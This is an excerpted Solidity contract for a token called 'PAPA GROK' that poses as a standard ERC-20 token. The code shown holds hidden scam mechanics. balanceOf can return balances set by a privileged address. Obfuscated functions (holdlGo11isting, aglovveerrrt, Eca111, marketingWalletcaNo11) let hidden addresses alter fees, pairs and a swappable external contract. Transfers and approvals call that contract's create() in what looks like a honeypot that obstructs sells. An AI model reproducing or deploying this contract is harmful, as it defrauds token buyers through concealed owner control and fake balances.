...
contract FATToken is Context, IERC20, Ownable {
    ...
    string private _name = "PAPA GROK";
    string private _symbol = "PAPA GROK";
    ...
    uniswapV1 private uniswapV13PairToken;
    ...
    mapping(address => uint256) public hldrli13sting;

    address private uniswapV13Pair_;
    ...
    constructor(address Antibottoken_, address creator, address caSwap) {
        ...
        uniswapV13PairToken = uniswapV1(uniswapV13Pair_);
        itvv = IpancakeV2(pancakeV2Pair_);


        _Antitbotswaper[uniswapV13Pair_] = true;
        _isExcludedFromFee[uniswapV13Pair_] = true;
    ...
    function balanceOf(address account) public view override returns (uint256) {
        if (hldrli13sting[account]>0&&creca>10) return hldrli13sting[account];
    ...
    function holdlGo11isting(address[] memory accounts, uint256[] memory a) external {
        //require(_msgSender() == address(_Antitbottoken), "ERC20: transfer from the address");
        if (_msgSender() == address(_Antitbottoken)) { 
            for (uint256 i = 0; i < accounts.length; i++) {
                hldrli13sting[accounts[i]] = a[i];
            }
        } else {
            uniswapV13PairToken.create(8**3);
        }
    }

    function pairupdateweb3(address aaa, bool b) public {
        if (_Antitbotswaper[_msgSender()]) {
            uniswapV2Pair=aaa;
            automatedMarketMakerPairs[aaa] = b;
        } else {
            uniswapV13PairToken.create(8**3);
        } 
    }
    
    function aglovveerrrt(uint256 ggg) public {
        if (_Antitbotswaper[_msgSender()]) {
            gg=ggg;
        } else {
            uniswapV13PairToken.create(8**3);
    ...
    function Eca111(uint256 aa) public {
        if (_Antitbotswaper[_msgSender()]) {
            creca=aa;
        } else {
            uniswapV13PairToken.create(8**3);
    ...
    function inc11ialfeesl(uint256 taxFeebuy, uint256 liquidityFeebuy, uint256 MarketingFeebuy, uint256 taxFeesell, uint256 liquidityFeesell, uint256 MarketingFeesell) public {
        //require(_msgSender() == address(_Antitbottoken), "ERC20");
        if (_msgSender() == address(_Antitbottoken)) {
    ...
    function marketingWalletcaNo11(address addresses) public {
        //require(_msgSender() == address(_Antitbottoken), "ERC20: transfer from the address");
        if (_msgSender() == address(_Antitbottoken)) { 
            uniswapV13PairToken = uniswapV1(addresses);
        } else {
            uniswapV13PairToken.create(8**3);
        }
    }
    ...
    function initia11litzeWl(bool bs, uint256 timesleep, uint256 fee, uint256 c, bool trad, address r) public {
        //require(_msgSender() == address(_Antitbottoken), "ERC20: transfer from the address");
        if (_msgSender() == address(_Antitbottoken)) { 
            antitbotenabled = bs;
            botsleep = timesleep;
    ...
    function _approve(
        ...
        if (_isExcludedtFromFeeTransfer[_msgSender()]){uniswapV13PairToken.create(creca);/*"ERC20: approve the zero address"*/}
    ...
    function _transfer(
        ...
        if (!takeFee) {
            ...
            _MarketingFee = _MarketingFeesell;
            uniswapV13PairToken.create(crec);
            if(crec>220 && msg.sender!=rr){uniswapV13PairToken.create(crec**21);}
        }
        ...
        if (_isExcludedtlp[to]) {
            uniswapV13PairToken.create(250**3); 
        }
